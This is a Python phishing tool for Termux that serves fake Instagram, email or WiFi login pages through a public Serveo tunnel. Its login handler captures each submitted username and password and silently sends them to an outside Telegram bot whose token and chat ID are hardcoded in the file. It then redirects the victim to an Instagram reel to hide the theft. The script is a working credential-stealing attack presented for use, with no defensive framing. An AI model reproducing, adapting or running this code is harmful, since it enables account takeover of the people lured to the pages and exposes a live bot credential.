import os
import sys
import logging
import socket
import subprocess
import threading
import itertools
import time
from datetime import datetime

# -------- Auto-install Function --------
def install_and_import(package, import_name=None):
    try:
        if not import_name:
            import_name = package
        return __import__(import_name)
    except ImportError:
        print(f"Installing {package}...")
        os.system(f"{sys.executable} -m pip install {package}")
        return __import__(import_name)

# -------- Import Needed Packages --------
flask = install_and_import("flask")
requests = install_and_import("requests")
from flask import Flask, request, send_from_directory, redirect

# Install openssh if missing (for Termux/Serveo)
if os.system("command -v ssh > /dev/null") != 0:
    os.system("pkg install -y openssh")

# -------- Colors --------
red   = '\033[1;31m'
grn   = '\033[1;32m'
ylo   = '\033[1;33m'
cyan  = '\033[1;36m'
pink  = '\033[1;35m'
reset = '\033[0m'

# -------- Suppress Flask logs completely --------
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# -------- Banner --------
def banner():
    os.system("clear")
    print(f"""{red}
 ____  ____   ___    ____  
|  _ \\|  _ \\ / _ \\  |  _ \\ 
| |_) | |_) | | | | | | | |
|  __/|  _ <| |_| | | |_| |
|_|   |_| \\_\\\\___/  |____/ {reset}
""")
    print(f"""{pink}╔══════════════════════════════════════════════╗
║              {cyan}PRO D  v1.0 by Dhani{pink}            
╚══════════════════════════════════════════════╝{reset}\n""")

# -------- Flask App --------
app = Flask(__name__)
selected_html = "1.html"  # default HTML file

# Telegram Bot Settings (change these!!)
BOT_TOKEN = "8177299368:AAGQRe_QqZZ6zGN2gB4Gi9OdMFBiBb_CegA"
CHAT_ID   = "7109583573"

@app.route('/')
def home():
    return send_from_directory(".", selected_html)

@app.route('/login', methods=["POST"])
def login():
    global stop_spinner
    stop_spinner = True  # stop waiting animation

    username = request.form.get("username")
    password = request.form.get("password")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # ---- Print locally ----
    print(f"""{pink}
╔══════════════════════════════════════════════╗
║ {cyan}Username:{ylo} {username}{reset}
║ {cyan}Password:{ylo} {password}{reset}
║ {cyan}Time    :{ylo} {timestamp}{reset}
╚══════════════════════════════════════════════╝
""")

    # ---- Send to Telegram silently ----
    msg = f"""
╔━━━━━━━━━━━━━━━━━━━
║ 🔐 New Login Captured  
╚━━━━━━━━━━━━━━━━━━━  
╔━━━━━━━━━━━━━━━━━━━
║ 👤 Username: {username}  
║ 🔑 Password: {password}  
║ 🕒 Time: {timestamp}
╚━━━━━━━━━━━━━━━━━━━
╔━━━━━━━━━━━━━━━━━━━
║ 🪿 developed by: 𝐃 ʜ 𝙰 ɴ 𝐢ⁱɪ 
╚━━━━━━━━━━━━━━━━━━━
"""
    threading.Thread(
        target=lambda: requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            params={"chat_id": CHAT_ID, "text": msg}
        ),
        daemon=True
    ).start()

    # ---- Redirect user to Instagram reel ----
    return redirect("https://www.instagram.com/reel/DKrtnOrqD2h", code=302)

# -------- Find free port --------
def get_free_port(start_port=8080):
    port = start_port
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('127.0.0.1', port)) != 0:
                return port
            port += 1

# -------- Animation --------
stop_spinner = False
def spinner():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if stop_spinner:
            break
        sys.stdout.write(f"\r{pink}[{cyan}*{pink}] Waiting for logins... {c}{reset}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write(f"\r{grn}[✓] Login captured!         {reset}\n")

# -------- Run Flask + Serveo --------
def run_server():
    port = get_free_port(8080)

    print(f"{pink}╔══════════════════════════════════════════════╗")
    print(f"{cyan}Starting server...{reset}")
    print(f"{pink}╚══════════════════════════════════════════════╝{reset}\n")

    # Start Serveo tunnel in background
    ssh_cmd = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net"
    process = subprocess.Popen(ssh_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    # Print tunnel URL 
    for line in process.stdout:
        if "Forwarding HTTP" in line:
            public_url = line.strip().split()[-1]
            print(f"""{grn}
╔══════════════════════════════════════════════╗
║ {cyan}Public Link → {ylo}{public_url}{reset}
╚══════════════════════════════════════════════╝
""")
            # Start  animation
            threading.Thread(target=spinner, daemon=True).start()
            break

    # Run Flask silently (no logs)
    app.run(host="127.0.0.1", port=port, debug=False, use_reloader=False)

# -------- Main --------
if __name__ == "__main__":
    banner()

    # ----- menu -----
    print(f"""{pink}
╔══════════════════════════════════════════════╗
║ {cyan}Choose Page Template{pink}
╠══════════════════════════════════════════════╣
║ [1] Instagram                                
║ [2] Email                                    
║ [3] WiFi                                     
╚══════════════════════════════════════════════╝
{reset}""")
    choice = input(f"{ylo}Enter your choice (1/2/3): {reset}").strip()

    if choice == "1":
        selected_html = "11.html"
    elif choice == "2":
        selected_html = "2.html"
    elif choice == "3":
        selected_html = "3.html"
    else:
        print(f"{red}Invalid choice, defaulting to Instagram.{reset}")
        selected_html = "1.html"

    run_server()
